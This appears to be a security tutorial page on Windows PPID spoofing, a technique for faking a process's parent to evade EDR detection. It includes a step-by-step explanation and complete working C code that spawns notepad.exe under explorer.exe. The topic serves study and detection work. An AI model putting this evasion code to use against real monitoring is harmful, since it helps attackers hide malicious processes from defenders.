---
icon: closed-captioning-slash
---

# PPID Spoofing

## PPID Spoofing

### What is it

Every process on Windows has a parent. When you open Chrome, Explorer is the parent. When a script runs cmd.exe, that script is the parent. Windows tracks all of this through the Parent Process ID, or PPID. Defenders and security tools rely on these relationships to spot malicious activity. If Word suddenly spawns cmd.exe, that is a massive red flag and most EDRs will catch it instantly.

PPID spoofing is just lying about who the parent is. You spawn a process but tell Windows that someone else created it, like explorer.exe or svchost.exe. From the outside it looks completely normal, the process tree makes sense and nothing looks suspicious.

<figure><img src="../.gitbook/assets/image (45).png" alt=""><figcaption></figcaption></figure>

***

### The idea behind it

Windows lets you pass extra information to CreateProcess through an extended startup struct called STARTUPINFOEXA. The normal STARTUPINFO is basic, it just holds stuff like window size and title. The extended version has an extra field called lpAttributeList which is a pointer to an attribute list. That attribute list is where you can specify a fake parent process.

So the whole technique is basically building that attribute list, putting a handle to your fake parent inside it, plugging it into STARTUPINFOEXA, and then calling CreateProcess with a special flag that tells Windows to actually read the extended info. Windows reads the fake parent handle and records it as the PPID of the new process. That is the whole trick.

***

### Walking through the code

The first thing you do is open a handle to whatever process you want to pretend is the parent. In most cases this is explorer.exe since it is a totally normal parent for a lot of processes. You grab its PID from Task Manager or a process snapshot and call OpenProcess on it.

```c
DWORD targetPid = 3440;  // explorer.exe pid from task manager
HANDLE hParent = OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetPid);
```

Then you set up your structs. You need STARTUPINFOEXA and PROCESS\_INFORMATION. You wipe them clean with RtlSecureZeroMemory so there are no garbage values sitting in memory. You also have to set the cb field to the size of STARTUPINFOEXA. Windows uses cb to figure out which version of the struct you are passing, without it CreateProcess will reject the call entirely.

```c
RtlSecureZeroMemory(&SiEx, sizeof(STARTUPINFOEXA));
RtlSecureZeroMemory(&Pi,   sizeof(PROCESS_INFORMATION));
SiEx.StartupInfo.cb = sizeof(STARTUPINFOEXA);
```

Next you build the full path to whatever process you want to spawn. You cannot just pass "notepad.exe" to CreateProcess, it needs a full path. You grab the Windows directory from the environment with GetEnvironmentVariableA which gives you something like C:\Windows, then you use sprintf to glue it together into C:\Windows\System32\notepad.exe. This way it works on any machine regardless of where Windows is installed.

```c
GetEnvironmentVariableA("WINDIR", WnDr, MAX_PATH);
sprintf(lpPath, "%s\\System32\\%s", WnDr, "notepad.exe");
```

Now comes the attribute list part. InitializeProcThreadAttributeList has to be called twice and this is the part that confuses most people. The first call is intentional fail, you pass NULL for the list and Windows tells you how many bytes it needs by writing the size into sThreadAttList. Then you allocate that exact amount of memory on the heap. Then you call it again with the real pointer and it actually sets up the structure in that memory. Windows designed it this way because the size changes depending on how many attributes you want, so you have to ask first.

```c
InitializeProcThreadAttributeList(NULL, 1, NULL, &sThreadAttList);

pThreadAttList = (PPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(
    GetProcessHeap(), HEAP_ZERO_MEMORY, sThreadAttList
);

InitializeProcThreadAttributeList(pThreadAttList, 1, NULL, &sThreadAttList);
```

Once the list is ready you call UpdateProcThreadAttribute with the PROC\_THREAD\_ATTRIBUTE\_PARENT\_PROCESS flag. That flag just tells the API that you want to update the parent process property specifically. You pass the handle to your fake parent and that is it, the lie is now inside the attribute list.

```c
UpdateProcThreadAttribute(
    pThreadAttList, NULL,
    PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
    &hParent, sizeof(HANDLE),
    NULL, NULL
);
```

Then you connect the attribute list to SiEx by setting lpAttributeList. This is the bridge between everything you built and the struct that CreateProcess actually reads. If you skip this line the attribute list just sits there in memory doing nothing.

```c
SiEx.lpAttributeList = pThreadAttList;
```

Finally you call CreateProcess. The key thing here is the EXTENDED\_STARTUPINFO\_PRESENT flag. Without that flag Windows completely ignores the extended struct and your attribute list. With it, Windows reads the fake parent from the list and records it as the PPID of the spawned process.

```c
CreateProcessA(
    NULL, lpPath,
    NULL, NULL, FALSE,
    EXTENDED_STARTUPINFO_PRESENT,
    NULL, NULL,
    &SiEx.StartupInfo, &Pi
);
```

After that clean up your handles and free the attribute list with DeleteProcThreadAttributeList.

***

### Full code

```c
#define _CRT_SECURE_NO_WARNINGS
#include <windows.h>
#include <stdio.h>

int main() {

    CHAR    lpPath[MAX_PATH * 2];
    CHAR    WnDr[MAX_PATH];

    SIZE_T                      sThreadAttList = NULL;
    PPROC_THREAD_ATTRIBUTE_LIST pThreadAttList = NULL;

    STARTUPINFOEXA      SiEx = { 0 };
    PROCESS_INFORMATION Pi   = { 0 };

    DWORD   targetPid = 3440;  // replace with your explorer.exe pid
    HANDLE  hParent   = NULL;

    RtlSecureZeroMemory(&SiEx, sizeof(STARTUPINFOEXA));
    RtlSecureZeroMemory(&Pi,   sizeof(PROCESS_INFORMATION));
    SiEx.StartupInfo.cb = sizeof(STARTUPINFOEXA);

    hParent = OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetPid);
    if (hParent == NULL) {
        printf("[!] OpenProcess failed: %d\n", GetLastError());
        return -1;
    }

    if (!GetEnvironmentVariableA("WINDIR", WnDr, MAX_PATH)) {
        printf("[!] GetEnvironmentVariableA failed: %d\n", GetLastError());
        return -1;
    }
    sprintf(lpPath, "%s\\System32\\%s", WnDr, "notepad.exe");

    InitializeProcThreadAttributeList(NULL, 1, NULL, &sThreadAttList);

    pThreadAttList = (PPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(
        GetProcessHeap(), HEAP_ZERO_MEMORY, sThreadAttList
    );
    if (pThreadAttList == NULL) {
        printf("[!] HeapAlloc failed: %d\n", GetLastError());
        return -1;
    }

    if (!InitializeProcThreadAttributeList(pThreadAttList, 1, NULL, &sThreadAttList)) {
        printf("[!] InitializeProcThreadAttributeList failed: %d\n", GetLastError());
        return -1;
    }

    if (!UpdateProcThreadAttribute(
            pThreadAttList, NULL,
            PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
            &hParent, sizeof(HANDLE),
            NULL, NULL)) {
        printf("[!] UpdateProcThreadAttribute failed: %d\n", GetLastError());
        return -1;
    }

    SiEx.lpAttributeList = pThreadAttList;

    if (!CreateProcessA(
            NULL, lpPath,
            NULL, NULL, FALSE,
            EXTENDED_STARTUPINFO_PRESENT,
            NULL, NULL,
            &SiEx.StartupInfo, &Pi)) {
        printf("[!] CreateProcessA failed: %d\n", GetLastError());
        return -1;
    }

    printf("[+] Process spawned! PID: %d\n", Pi.dwProcessId);

    DeleteProcThreadAttributeList(pThreadAttList);
    CloseHandle(hParent);
    CloseHandle(Pi.hProcess);
    CloseHandle(Pi.hThread);

    return 0;
}
```

***

### Verifying it worked

Run the binary then open Process Hacker or Process Explorer. Find notepad.exe in the list, right click it and check its parent. It should show explorer.exe as the parent instead of your actual binary. That means the spoof worked.

<figure><img src="../.gitbook/assets/image (46).png" alt=""><figcaption></figcaption></figure>
